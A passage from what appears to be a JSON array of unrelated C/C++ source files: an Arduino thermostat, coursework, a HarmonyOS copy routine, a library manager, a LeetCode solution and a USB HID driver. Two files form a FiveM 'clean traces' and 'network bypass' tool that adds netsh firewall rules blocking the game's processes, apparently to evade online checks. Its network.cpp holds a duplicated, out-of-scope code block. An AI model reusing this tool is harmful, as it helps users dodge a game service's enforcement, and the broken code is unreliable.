25;\n    lcd.begin(16, 2);  // initialize the lcd\n    lcd.createChar(1, dotOff);\n    lcd.createChar(2, dotOn);\n\n  } else {\n    Serial.println(\": LCD not found.\");\n  }  // if\n\n}  // setup()\n\nvoid aumenta() {\n  show++;\n  if (show > 40) {\n    show = 20;  // Volta para 20 quando chega em 40\n  }\n}\n\nvoid diminui() {\n  show--;\n  if (show < 20) {\n    show = 40;  // Volta para 40 se cair abaixo de 20\n  }\n}\n\n\nvoid atualizaTemperatura() {\n  sensor.requestTemperatures();                // Envia comando para realizar a convers\u00e3o de temperatura\n  if (!sensor.getAddress(endereco_temp, 0)) {  // Encontra o endereco do sensor no barramento\n    Serial.println(\"SENSOR NAO CONECTADO\");    // Sensor n\u00e3o conectado, imprime mensagem de erro\n  } else {\n    temptotal = sensor.getTempC(endereco_temp);  // Corrigido erro de sintaxe\n  }\n}\n\nvoid atualizaContador() {\n  int valor1 = digitalRead(botao1);\n  int valor2 = digitalRead(botao2);\n\n  if (valor1 == HIGH) {\n    aumenta();\n  }\n\n  if (valor2 == HIGH) {\n    diminui();\n  }\n}\n\nvoid ativaRele() {\n  if (temptotal < show) {\n    digitalWrite(PINO_RELE, HIGH);\n    //digitalWrite(PINO_FAN, LOW);\n  } else if (temptotal > show) {\n    digitalWrite(PINO_RELE, LOW);\n    //digitalWrite(PINO_FAN, HIGH);\n  }\n}\n\nvoid loop() {\n  bool reset = true;\n  int valor3 = digitalRead(botao3);\n\n  lcd.setBacklight(1);\n  lcd.home();\n  lcd.clear();\n  lcd.setCursor(0, 0);  // Atualiza apenas a primeira linha\n  lcd.print(reset);\n  lcd.print(\" Alvo: \");\n  lcd.print(show);\n  lcd.setCursor(0, 1);  // Atualiza apenas a segunda linha\n  lcd.print(\"Temp: \");\n  lcd.print(temptotal, 1);\n\n  Serial.println(reset);\n\n  atualizaContador();\n  atualizaTemperatura();\n\n  if (valor3 == HIGH) {\n    reset = !reset;\n  }\n\n  if (reset == true) {\n    ativaRele();\n  }\n\n  delay(500);\n}\n",
    "// Brij Malhotra\n// lab3.cpp\n// Purpose: Multi file classes\n\n#include <iostream>\n#include \"Polar.h\"\n#include \"Cartesian.h\"\n#include <cmath>\n\nusing namespace std;\n\nclass Cartesian;\n\nPolar::Polar(double rIn, double angleIn){\n    r = rIn;\n    angle = angleIn;\n\n    if (angle > 0){\n        while (angle >= 2*M_PI){\n            angle -= 2*M_PI;\n        }\n    }\n    else if (angle < 0){\n        while (angle < -2*M_PI){\n            angle += 2*M_PI;\n        }\n        angle = (-1) * angle;\n        angle = 2*M_PI - angle;\n    }\n}\n\nPolar::Polar(const Cartesian cartesianIn){\n    double x = cartesianIn.getX();\n    double y = cartesianIn.getY();\n\n    r = sqrt(x*x + y*y);\n\n    if (x == 0){\n        angle = 0;\n    } else if (x > 0  && y > 0){\n        angle = atan(y/x);\n    } else if (x < 0){\n        angle = M_PI + atan(y/x);\n    } else {\n        angle = 2*M_PI + atan(y/x);\n    }\n}\n\ndouble Polar::getAngle() const {\n    return angle;\n}\n\ndouble Polar::getR() const {\n    return r;\n}\n\ndouble Polar::toDegrees() const {\n    double theta = ((angle * 180) / M_PI);\n\n    return theta; \n}",
    "\ufeff#include \"core/trace.hpp\"\r\n#include \"core/network.hpp\"\r\n\r\nint main()\r\n{\r\n\tint choice;\r\n\r\n\twhile (true)\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\r\n\t\tstd::cout << R\"(\r\n                                            \r\n                                                            \r\n                 *//                                          \r\n             .*/****/.       ,***************                 \r\n        *****************************************             \r\n      ******(***************************************          \r\n   .********%#***************************************         \r\n   **************************************************.        \r\n        ////**********************//******************        \r\n                ////*************////*****************        \r\n                   ////*******///////****************         \r\n                       //*****///////*********************    \r\n                          ***.          *********     ******* \r\n                        *****        ********             ****\r\n                                                          ****\r\n                                                      ,*****  \r\n                             .*************************       \r\n\r\n\t)\" << '\\n';\r\n\r\n\t\tg_network = std::make_unique<network>();\r\n\t\tg_trace = std::make_unique<trace>();\r\n\r\n\t\twhile (true)\r\n\t\t{\r\n\t\t\tg_trace->m_fivem_path = g_trace->set_folder(\"Select FiveM Folder which contains FiveM.exe\");\r\n\r\n\t\t\tsystem(\"cls\");\r\n\r\n\t\t\tif (!g_trace->m_fivem_path.empty())\r\n\t\t\t{\r\n\t\t\t\tstd::cout << \"  [Selected Folder]  \" << g_trace->m_fivem_path << std::endl;\r\n\t\t\t\tstd::cout << \"  [Launch Build]  \" << g_trace->get_launch_build() << \"\\n\" << std::endl;\r\n\t\r\n\t\t\t\tstd::cout << \"  [1]  :  \" << \"clean traces\" << std::endl;\r\n\t\t\t\tstd::cout << \"  [2]  :  \" << \"enable network bypass\" << std::endl;\r\n\t\t\t\tstd::cout << \"  [3]  :  \" << \"disable network bypass\" << std::endl;\r\n\t\t\t\tstd::cout << \"  [4]  :  \" << \"reset fivem path\" << std::endl;\r\n\t\t\t\tstd::cout << \"  [5]  :  \" << \"edit launch options\" << std::endl;\r\n\t\t\t\tstd::cin >> choice;\r\n\r\n\t\t\t\tswitch (choice)\r\n\t\t\t\t{\r\n\t\t\t\t\tcase 1:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_trace->setup();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 2:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_network->setup();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 3:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_network->destroy();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 4:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_trace->destroy();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 5:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_trace->set_launch_build();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tstd::cout << \"  [Error]  :  \" << \"select valid folder for FiveM\" << \"\\n\" << std::endl;\r\n\t\t\t}\r\n\r\n\t\t\tsystem(\"Pause\");\r\n\t\t}\r\n\r\n\t\tsystem(\"Pause\");\r\n\t}\r\n\r\n}\r\n",
    "#include \"napi/native_api.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <dirent.h>\n#include <time.h>\n#include <hilog/log.h>\n\n#define TAG \"DumpHarmonyNative\"\n#define MAX_PATH_LEN 256\n#define FILE_BUF_SIZE 4096\n\nstatic napi_status copy_from_ts(napi_env env, napi_callback_info info, size_t require_argc, napi_value *argv) {\n    if (env == nullptr || info == nullptr || argv == nullptr) {\n        OH_LOG_Print(LOG_APP, LOG_ERROR, 0, TAG, \"env, callback_info or argv is null\");\n        return napi_invalid_arg;\n    }\n    size_t real_argc = require_argc;\n    napi_status status;\n    if ((status = napi_get_cb_info(env, info, &real_argc, argv, nullptr, nullptr)) != napi_ok) {\n        OH_LOG_Print(LOG_APP, LOG_ERROR, 0, TAG, \"napi_get_cb_info failed, returns %{public}d\", status);\n        return status;\n    }\n    if (real_argc != require_argc) {\n        OH_LOG_Print(LOG_APP, LOG_ERROR, 0, TAG, \"Missing parameters, required %{public}zu but received %{public}zu.\",\n                     require_argc, real_argc);\n        return napi_invalid_arg;\n    }\n    return napi_ok;\n}\n\nstatic char *get_string_utf_chars(napi_env env, napi_value arg, size_t max_len) {\n    if (env == nullptr || arg == nullptr) {\n        OH_LOG_Print(LOG_APP, LOG_ERROR, 0, TAG, \"env or arg is null\");\n        return nullptr;\n    }\n\n    char *buf = (char *)malloc(max_len * sizeof(char));\n    if (buf == nullptr) {\n        return nullptr;\n    }\n\n    size_t len = 0;\n    napi_status status;\n    if ((status = napi_get_value_string_utf8(env, arg, buf, max_len, &len)) != napi_ok) {\n        OH_LOG_Print(LOG_APP, LOG_ERROR, 0, TAG, \"napi_get_value_string_utf8 failed, returns %{public}d\", status);\n        return nullptr;\n    }\n\n    char *utf = (char *)realloc(buf, (len + 1) * sizeof(char));\n    if (utf == nullptr) {\n        free(buf);\n        return nullptr;\n    }\n\n    utf[len] = '\\0';\n    return utf;\n}\n\nstatic void release_string_utf_chars(char *utf) {\n    if (utf != nullptr) {\n        free(utf);\n        utf = nullptr;\n    }\n}\n\nnapi_status copy_dir(const char *src, const char *dst) {\n    DIR *dir;\n    struct dirent *entry;\n\n    if ((dir = opendir(src)) == nullptr) {\n        OH_LOG_Print(LOG_APP, LOG_ERROR, 0, TAG, \"Error opening source directory: %{public}s\", src);\n        return napi_invalid_arg;\n    }\n    \n    napi_status status = napi_ok;\n\n    while ((entry = readdir(dir)) != nullptr) {\n        if (strcmp(entry->d_name, \".\") == 0 || strcmp(entry->d_name, \"..\") == 0) {\n            continue;\n        }\n\n        char currentSrc[strlen(src) + strlen(entry->d_name) + 2];\n        char currentDst[strlen(dst) + strlen(entry->d_name) + 2];\n\n        sprintf(currentSrc, \"%s/%s\", src, entry->d_name);\n        sprintf(currentDst, \"%s/%s\", dst, entry->d_name);\n\n        if (entry->d_type == DT_DIR) {\n            mkdir(currentDst, 0700);\n            napi_status tmp_status = copy_dir(currentSrc, currentDst);\n            if (tmp_status != napi_ok) {\n                status = tmp_status;\n                OH_LOG_Print(LOG_APP, LOG_WARN, 0, TAG, \"Error copying dir: %{public}s.\", currentSrc);\n            }\n        } else if (entry->d_type == DT_REG){\n            FILE *sourceFile = fopen(currentSrc, \"rb\");\n            FILE *destinationFile = fopen(currentDst, \"wb\");\n\n            if (sourceFile == nullptr) {\n                OH_LOG_Print(LOG_APP, LOG_WARN, 0, TAG, \"Cannot open source file: %{public}s.\", currentSrc);\n            } else if (destinationFile == nullptr) {\n                OH_LOG_Print(LOG_APP, LOG_WARN, 0, TAG, \"Cannot open destination file: %{public}s.\", currentDst);\n            } else {\n                char buf[FILE_BUF_SIZE];\n                while (!feof(sourceFile)) {\n                    size_t bytesRead = fread(buf, 1, FILE_BUF_SIZE, sourceFile);\n                    fwrite(buf, 1, bytesRead, destinationFile);\n                }\n                fclose(sourceFile);\n                fclose(destinationFile);\n            }\n        }\n    }\n    closedir(dir);\n    \n    return status;\n}\n\nstatic napi_value copy_dir(napi_env env, napi_callback_info info)\n{\n    size_t requireArgc = 2;\n    napi_value argv[2] = {nullptr};\n\n    napi_status status;\n    if ((status = copy_from_ts(env, info, requireArgc, argv)) != napi_ok) {\n        char status_str[3];\n        snprintf(status_str, 3, \"%d\", status);\n        napi_throw_error(env, status_str, \"copy_from_ts failed.\");\n        return nullptr;\n    }\n    \n    char *src = nullptr;\n    if ((src = get_string_utf_chars(env, argv[0], MAX_PATH_LEN)) == nullptr) {\n        napi_throw_error(env, \"1\", \"get_string_utf_chars src failed.\");\n        return nullptr;\n    }\n\n    char *dst = nullptr;\n    if ((dst = get_string_utf_chars(env, argv[1], MAX_PATH_LEN)) == nullptr) {\n        napi_throw_error(env, \"1\", \"get_string_utf_chars dst failed.\");\n        return nullptr;\n    }\n    \n    status = copy_dir(src, dst);\n    \n    release_string_utf_chars(src);\n    release_string_utf_chars(dst);\n\n    napi_value result;\n    napi_create",
    "#include <bits/stdc++.h>\n#include <iostream>\n#include <list>\n#include <string>\n#include <conio.h>\n#include <vector>\n#include <fstream>\n#include <iomanip>\n#include <Windows.h>\n#include <queue>\n#include <cstdlib>\n#include <ctime>\nusing namespace std;\nHANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);\nCOORD CursorPosition;\nifstream inAdmin;\nifstream inBook;\nifstream inTicket;\nifstream inUser;\nofstream outAdmin;\nofstream outBook;\nofstream outTicket;\nofstream outUser ;\ntemplate< class T >\nvoid setposition( T x, T y)\n{\n\tCursorPosition.X=x;\n\tCursorPosition.Y=y;\n\tSetConsoleCursorPosition(console, CursorPosition);\n}\n\nvoid textcolor(int x)\n{\n\tHANDLE color ;\n\tcolor  = GetStdHandle(STD_OUTPUT_HANDLE);\n\tSetConsoleTextAttribute(color , x);\n}\ntemplate < class T ,class N >\nvoid gotocolor( T x,T  y, N s,T color )\n{\n\tsetposition(x,y);\n\ttextcolor(color );\n\tcout << s;\n\ttextcolor(7);\n}\ntemplate< class T >\nvoid textColor (T x,T y,T color )\n{\n\tsetposition(x,y);\n\ttextcolor(color );\n\ttextcolor(7);\n}\ntemplate < class T ,class N >\nvoid write( T x, T y, N z)\n{\n\tsetposition(x, y);\n\tcout << z;\n}\ntemplate < class T ,class N >\nclass  CBook {\n\tpublic:\n\t\tN strBookCode ;\n\t\tN strBookTitle;\n\t\tN strAuthor;\n\t\tN strPublisher;\n\t\tT fPrice;\n\t\tT lYear;\n\t\tT lpage;\n\t\tN strDate;\n\t\tT lBookStatus;\n\tpublic:\n\t\tvoid operator = (CBook  s)\n\t\t{\n\t\t\tstrBookCode =s.strBookCode ;\n\t\t\tstrBookTitle=s.strBookTitle;\n\t\t\tstrAuthor=s.strAuthor;\n\t\t\tstrPublisher=s.strPublisher;\n\t\t\tfPrice=s.fPrice;\n\t\t\tlYear=s.lYear;\n\t\t\tlpage=s.lpage;\n\t\t\tstrDate=s.strDate;\n\t\t\tlBookStatus=s.lBookStatus;\n\t\t}\n\t\t~CBook (){}\n\t\tfriend istream& operator >> (istream& is,CBook & s)\n\t\t{\n\t\t\tgetline(is,s.strBookCode );\n\t\t\tgetline(is,s.strBookTitle);\n\t\t\tgetline(is,s.strAuthor);\n\t\t\tgetline(is,s.strPublisher);\n\t\t\tis >> s.fPrice;\n\t\t\tis >> s.lYear;\n\t\t\tis >> s.lpage;\n\t\t\tis.ignore();\n\t\t\tgetline(is,s.strDate);\n\t\t\tis >> s.lBookStatus;\n\t\t\tis.ignore();\n\t\t\treturn is;\n\t\t}\n\t\tfriend ostream& operator << (ostream& os,CBook  s)\n\t\t{\n\t\t\tos << s.strBookCode  << '\\n' << s.strBookTitle << '\\n' << s.strAuthor << '\\n' << s.strPublisher << '\\n' << s.fPrice << '\\n' << s.lYear << '\\n' << s.lpage << '\\n' << s.strDate << '\\n' << s.lBookStatus << '\\n';\n\t\t\treturn os;\n\t\t}\n\t\tbool operator ==(CBook  s)\n\t\t{\n\t\t\treturn (strBookCode ==s.strBookCode );\n\t\t}\n};\ntemplate <class T , class N >\nclass CTicket{\n\tpublic:\n\t\tT lNumberTicket;\n\t\tN strReaderCode;\n\t\tN strBookCode ;\n\t\tN strLoanDate;\n\t\tN strPaymentDate;\n\t\tT lPaymentDate;\n\tpublic:\n\t\tvoid operator = (CTicket p)\n\t\t{\n\t\t\tlNumberTicket=p.lNumberTicket;\n\t\t\tstrReaderCode=p.strReaderCode;\n\t\t\tstrBookCode =p.strBookCode ;\n\t\t\tstrLoanDate=p.strLoanDate;\n\t\t\tlPaymentDate=p.lPaymentDate;\n\t\t}\n\t\t~CTicket(){}\n\t\tfriend istream& operator >> (istream& is,CTicket& p)\n\t\t{\n\t\t\tis >> p.lNumberTicket;\n\t\t\tis.ignore();\n\t\t\tgetline(is,p.strReaderCode);\n\t\t\tgetline(is,p.strBookCode );\n\t\t\tgetline(is,p.strLoanDate);\n\t\t\tgetline(is,p.strPaymentDate);\n\t\t\tis >> p.lPaymentDate;\n\t\t\tis.ignore();\n\t\t\treturn is;\n\t\t}\n\t\tfriend ostream& operator << (ostream& os,CTicket p)\n\t\t{\n\t\t\tos << p.lNumberTicket << '\\n' << p.strReaderCode << '\\n' << p.strBookCode  << '\\n' << p.strLoanDate << '\\n' << p.strPaymentDate << '\\n' << p.lPaymentDate << '\\n';\n\t\t\treturn os;\n\t\t}\n};\ntemplate <class N >\nclass CAdmin{\n\tN strUser ;\n\tN strPassWord;\n\tpublic:\n\t\tN getuser(){return strUser ;}\n\t\tN getstrPassWord(){return strPassWord;}\n\t\tbool operator == (CAdmin a)\n\t\t{\n\t\t\tif (strUser ==a.strUser  && strPassWord==a.strPassWord)\n\t\t\t\treturn true;\n\t\t\treturn false;\n\t\t}\n\t\tvoid operator = (CAdmin a)\n\t\t{\n\t\t\tstrUser =a.strUser ;\n\t\t\tstrPassWord=a.strPassWord;\n\t\t}\n\t\tCAdmin( N a, N b)\n\t\t{\n\t\t\tstrUser =a;\n\t\t\tstrPassWord=b;\n\t\t}\n\t\t~CAdmin(){}\n\t\tfriend istream& operator >> (istream& is,CAdmin& ad)\n\t\t{\n\t\t\tsetposition(101,20);is >> ad.strUser ;\n\t\t\tis >> ad.strPassWord;\n\t\t\treturn is;\n\t\t}\n\t\tfriend ostream& operator << (ostream& os,CAdmin ad)\n\t\t{\n\t\t\tos << ad.strUser  << '\\n' << ad.strPassWord;\n\t\t\treturn os;\n\t\t}\n};\ntemplate <class N >\nclass CUser{\n\tpublic:\n\t\tN strUserCode;\n\t\tN strName;\n\t\tN strRegistrationDate;\n\tpublic:\n\t\tvoid operator = (CUser us)\n\t\t{\n\t\t\tstrUserCode=us.strUserCode;\n\t\t\tstrName=us.strName;\n\t\t\tstrRegistrationDate=us.strRegistrationDate;\n\t\t}\n\t\t~CUser(){}\n\t\tfriend istream& operator >> (istream& is,CUser& us)\n\t\t{\n\t\t\tgetline(is,us.strUserCode);\n\t\t\tgetline(is,us.strName);\n\t\t\tgetline(is,us.strRegistrationDate);\n\t\t\treturn is;\n\t\t}\n};\nvector<CAdmin> Ad;\nlist<CBook > Sa;\nlist<CTicket> Ph;\nlist<CUser> Us;\nvoid saveDataBook()\n{\n\toutBook.open(\"Book.txt\",ios_base::out);\n\tfor (auto it=Sa.begin();it!=Sa.end();it++)\n\t\toutBook << *it;\n\toutBook.close();\n}\nvoid saveDataTicket()\n{\n\toutTicket.open(\"Ticket.txt\",ios_base::out);\n\tfor (auto it=Ph.begin();it!=Ph.end();it++)\n\t\toutTicket << *it;\n\toutTicket.close();\n}\nvoid login()\n{\n\ttextcolor(14);\n\tsetposition(64,16);cout << \"* * * * * * * * * * * * * * * * *\";\n\tsetposition(64,17); cout << \"*\";\n\ttextcolor(10);\n\tsetposition(72,17);cout << \"DANG NHAP HE THONG\";\n\ttextcolor(14);\n\tsetposition(96,17); cout << \"*\";\n\tsetposition(64,18);cout << \"* * * * * * * * * * * * * ",
    "// Date: Sat Sep 28 20:26:34 2024\n\n#include <cassert>\n#include <climits>\n#include <cmath>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n\n#include <algorithm>\n#include <array>\n#include <functional>\n#include <iomanip>\n#include <iostream>\n#include <map>\n#include <queue>\n#include <random>\n#include <set>\n#include <sstream>\n#include <stack>\n#include <string>\n#include <utility>\n#include <vector>\n\nusing namespace std;\n\ntypedef long long ll;\ntypedef unsigned long long ull;\ntypedef vector<int> VI;\ntypedef pair<int, int> PII;\ntypedef pair<ll, ll> PLL;\ntemplate <class T> using pq = priority_queue<T>;\ntemplate <class T> using pqg = priority_queue<T, vector<T>, greater<T>>;\n\nconst int INF = 0x3f3f3f3f, MOD = 1e9 + 7, MOD1 = 998'244'353;\nconst ll INFL = 0x3f3f3f3f'3f3f3f3f;\nconst double eps = 1e-8;\nconst int dir[8][2] = {\n    {0, 1}, {0, -1}, {1, 0}, {-1, 0}, {1, 1}, {1, -1}, {-1, 1}, {-1, -1},\n};\nmt19937_64 _m_gen64;\n\nconst ull Pr = 131;\n\n#define For(i, a, b) for (int i = int(a); i < int(b); ++i)\n#define Rof(i, a, b) for (int i = int(b) - 1; i >= int(a); --i)\n#define For1(i, a, b) for (int i = int(a); i <= int(b); ++i)\n#define Rof1(i, a, b) for (int i = int(b); i >= int(a); --i)\n#define ForE(i, j) for (int i = h[j]; i != -1; i = ne[i])\n\n#define f1 first\n#define f2 second\n#define pb push_back\n#define has(a, x) (a.find(x) != a.end())\n#define nemp(a) (!a.empty())\n#define all(a) (a).begin(), (a).end()\n#define all1(a, len) (a + 1), (a + 1 + len)\n#define SZ(a) int((a).size())\n#define NL cout << '\\n';\n\ntemplate <class T> bool ckmin(T &a, const T &b) { return b < a ? a = b, 1 : 0; }\ntemplate <class T> bool ckmax(T &a, const T &b) { return a < b ? a = b, 1 : 0; }\n\ntemplate <typename t> istream &operator>>(istream &in, vector<t> &vec) {\n  for (t &x : vec)\n    in >> x;\n  return in;\n}\n\ntemplate <typename t> ostream &operator<<(ostream &out, vector<t> &vec) {\n  int n = SZ(vec);\n  For(i, 0, n) {\n    out << vec[i];\n    if (i < n - 1)\n      out << ' ';\n  }\n  return out;\n}\n\n#ifdef _DEBUG\n#include \"debug.h\"\n#else\n#define dbg(x...)\n#define dbgi(x)\n#define dbgln()\n#define dbgr(x...)\n#endif\n\n// For LeetCode\n#define LN ListNode\n#define LNP ListNode *\n#define TN TreeNode\n#define TNP TreeNode *\n\n#ifdef _DEBUG\nstruct ListNode {\n  int val;\n  ListNode *next;\n  ListNode() : val(0), next(nullptr) {}\n  ListNode(int val) : val(val), next(nullptr) {}\n  ListNode(int val, ListNode *next) : val(val), next(next) {}\n};\n\nstruct TreeNode {\n  int val;\n  TreeNode *left;\n  TreeNode *right;\n  TreeNode() : val(0), left(nullptr), right(nullptr) {}\n  TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\n  TreeNode(int x, TreeNode *left, TreeNode *right)\n      : val(x), left(left), right(right) {}\n};\n\nvoid PrePrintLCTree(TNP root) {\n  if (!root)\n    return;\n  dbgi(root->val);\n  PrePrintLCTree(root->left);\n  PrePrintLCTree(root->right);\n}\n\nclass LCCodec {\npublic:\n  // Encodes a tree to a single string.\n  string serialize(TreeNode *root) {\n    if (!root)\n      return \"\";\n\n    vector<TNP> a;\n    a.pb(root);\n    string ans;\n\n    while (nemp(a)) {\n      vector<TNP> b;\n\n      string tmp;\n      for (auto x : a) {\n        if (nemp(ans)) {\n          ans += ',';\n        }\n\n        if (x)\n          ans += to_string(x->val);\n        else\n          ans += \"null\";\n      }\n\n      bool ok{false};\n      for (auto x : a) {\n        if (x) {\n          b.pb(x->left);\n          b.pb(x->right);\n\n          if (x->left || x->right) {\n            ok = true;\n          }\n        }\n      }\n\n      if (ok)\n        a = std::move(b);\n      else\n        a = {};\n    }\n\n    return ans;\n  }\n\n  // Decodes your encoded data to tree.\n  TreeNode *deserialize(string data) {\n    vector<TNP> a;\n    int n = SZ(data);\n    vector<string> b;\n\n    if (!n)\n      return nullptr;\n\n    string t;\n    for (auto x : data) {\n      if (x == ',') {\n        b.pb(t);\n        t = \"\";\n      } else\n        t += x;\n    }\n    b.pb(t);\n\n    for (auto x : b) {\n      if (x == \"null\")\n        a.pb(nullptr);\n      else\n        a.pb(new TN(stoi(x)));\n    }\n\n    int m = SZ(a);\n    int i = 0, j = 1;\n\n    while (i < m) {\n      while (i < m && !a[i])\n        ++i;\n      if (i >= n)\n        break;\n\n      if (j < m)\n        a[i]->left = a[j++];\n      if (j < m)\n        a[i]->right = a[j++];\n      ++i;\n    }\n\n    return a[0];\n  }\n};\n\n#endif\n// End of LeetCode\n\nclass Solution {\npublic:\n  bool doesValidArrayExist(vector<int> &a) {\n    int n{SZ(a)};\n    VI b(n);\n\n    auto check = [&](int x) {\n      b[0] = x;\n\n      For(i, 0, n) {\n        int id = i + 1, val = a[i] ^ b[i];\n        if (id == n)\n          return val == b[0];\n        else\n          b[id] = val;\n      }\n      return true;\n    };\n\n    return check(0) || check(1);\n  }\n};\n\n#ifdef _DEBUG\n\nint main(void) {\n  std::ios::sync_with_stdio(false);\n  cin.tie(NULL);\n  cout.tie(NULL);\n  _m_gen64.seed(Pr);\n\n  Solution a;\n  VI ve{1, 1, 0};\n  auto res = a.doesValidArrayExist(ve);\n  dbg(res);\n\n  return 0;\n}\n\n#endif\n",
    "#include \"network.hpp\"\r\n#include \"trace.hpp\"\r\n\r\nvoid network::block_connection(std::string process)\r\n{\r\n\tstd::string outbound = \"netsh advfirewall firewall add rule name = \" + process + \" dir = out program = \" + process + \"  action = block\";\r\n\tsystem(outbound.c_str());\r\n\r\n\tstd::string inbound = \"netsh advfirewall firewall add rule name = \" + process + \" dir = in program = \" + process + \"  action = block\";\r\n\tsystem(inbound.c_str());\r\n}\r\n\r\nvoid network::unblock_connection(std::string process)\r\n{\r\n\tstd::string outbound = \"netsh advfirewall firewall delete rule name = \" + process + \" dir = out program = \" + process;\r\n\tsystem(outbound.c_str());\r\n\r\n\tstd::string inbound = \"netsh advfirewall firewall delete rule name = \" + process + \" dir = in program = \" + process;\r\n\tsystem(inbound.c_str());\r\n}\r\n\r\nvoid network::setup()\r\n{\r\n\t// Locate FiveM.exe\r\n\tauto fivem_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.exe\";\r\n\tblock_connection(fivem_path);\r\n\r\n\r\n\t// Locate FiveM Subprocesses path\r\n\tauto subprocess_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.app\" + \"\\\\\" + \"data\" + \"\\\\\" + \"cache\" + \"\\\\\" \"subprocess\";\r\n\r\n\tstd::vector<std::string> gta_versions{ \"b2545_\", \"b2372_\", \"b2189_\", \"b2060_\",  \"\" };\r\n\r\n\tfor (auto processes : gta_versions)\r\n\t{\r\n\t\t// Block the gta processes\r\n\t\tauto gta_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"GTAProcess.exe\";\r\n\t\tblock_connection(gta_process);\r\n\r\n\t\t// Block the steam processes\r\n\t\tauto steam_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"SteamChild.exe\";\r\n\t\t\r\n\t\tblock_connection(steam_process);\r\n\t}\t// Block the steam processes\r\n\t\tauto steam_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"SteamChild.exe\";\r\n\t\tblock_connection(steam_process);\r\n\r\n}\r\n\r\n\r\nvoid network::destroy()\r\n{\r\n\t// Locate FiveM.exe\r\n\tauto fivem_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.exe\";\r\n\tunblock_connection(fivem_path);\r\n\r\n\t// Locate FiveM Subprocesses path\r\n\tauto subprocess_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.app\" + \"\\\\\" + \"data\" + \"\\\\\" + \"cache\" + \"\\\\\" \"subprocess\";\r\n\r\n\tstd::vector<std::string> gta_versions{ \"b2545_\", \"b2372_\", \"b2189_\", \"b2060_\",  \"\" };\r\n\r\n\tfor (auto processes : gta_versions)\r\n\t{\r\n\t\t// Block the gta processes\r\n\t\tauto gta_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"GTAProcess.exe\";\r\n\t\tunblock_connection(gta_process);\r\n\r\n\t\t// Block the steam processes\r\n\t\tauto steam_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"SteamChild.exe\";\r\n\t\tunblock_connection(steam_process);\r\n\t}\r\n}\r\n",
    "/* Copyright (C) 2011 Circuits At Home, LTD. All rights reserved.\n\nThis software may be distributed and modified under the terms of the GNU\nGeneral Public License version 2 (GPL2) as published by the Free Software\nFoundation and appearing in the file GPL2.TXT included in the packaging of\nthis file. Please note that GPL2 Section 2[b] requires that all works based\non this software must also be made publicly available under the terms of\nthe GPL2 (\"Copyleft\").\n\nContact information\n-------------------\n\nCircuits At Home, LTD\nWeb      :  http://www.circuitsathome.com\ne-mail   :  support@circuitsathome.com\n */\n\n#include \"Arduino.h\"\n#include \"hiduniversal.h\"\n\nHIDUniversal::HIDUniversal(USBHost *p) :\nHID(p),\nqNextPollTime(0),\npollInterval(0),\nbPollEnable(false),\nbHasReportId(false) {\n\t\tInitialize();\n\n\t\tif(pUsb)\n\t\t\tpUsb->RegisterDeviceClass(this);\n\t}\n\nuint16_t HIDUniversal::GetHidClassDescrLen(uint8_t type, uint8_t num) {\n\tfor(uint8_t i = 0, n = 0; i < HID_MAX_HID_CLASS_DESCRIPTORS; i++) {\n\t\tif(descrInfo[i].bDescrType == type) {\n\t\t\tif(n == num)\n\t\t\t\treturn descrInfo[i].wDescriptorLength;\n\t\t\tn++;\n\t\t}\n\t}\n\treturn 0;\n}\n\nvoid HIDUniversal::Initialize() {\n\tfor(uint8_t i = 0; i < MAX_REPORT_PARSERS; i++) {\n\t\trptParsers[i].rptId = 0;\n\t\trptParsers[i].rptParser = NULL;\n\t}\n\tfor(uint8_t i = 0; i < HID_MAX_HID_CLASS_DESCRIPTORS; i++) {\n\t\tdescrInfo[i].bDescrType = 0;\n\t\tdescrInfo[i].wDescriptorLength = 0;\n\t}\n\tfor(uint8_t i = 0; i < maxHidInterfaces; i++) {\n\t\thidInterfaces[i].bmInterface = 0;\n\t\thidInterfaces[i].bmProtocol = 0;\n\n\t\tfor(uint8_t j = 0; j < maxEpPerInterface; j++)\n\t\t\thidInterfaces[i].epIndex[j] = 0;\n\t}\n\tfor(uint8_t i = 0; i < totalEndpoints; i++) {\n\t\tepInfo[i].epAddr = 0;\n\t\tepInfo[i].maxPktSize = (i) ? 0 : 8;\n\t\tepInfo[i].bmSndToggle = 0;\n\t\tepInfo[i].bmRcvToggle = 0;\n\t\tepInfo[i].bmNakPower = (i) ? USB_NAK_NOWAIT : USB_NAK_MAX_POWER;\n\t}\n\tbNumEP = 1;\n\tbNumIface = 0;\n\tbConfNum = 0;\n\tpollInterval = 0;\n\n\tZeroMemory(constBuffLen, prevBuf);\n}\n\nuint32_t HIDUniversal::SetReportParser(uint32_t id, HIDReportParser *prs) {\n\tfor(uint8_t i = 0; i < MAX_REPORT_PARSERS; i++) {\n\t\tif(rptParsers[i].rptId == 0 && rptParsers[i].rptParser == NULL) {\n\t\t\trptParsers[i].rptId = id;\n\t\t\trptParsers[i].rptParser = prs;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\n\nHIDReportParser* HIDUniversal::GetReportParser(uint32_t 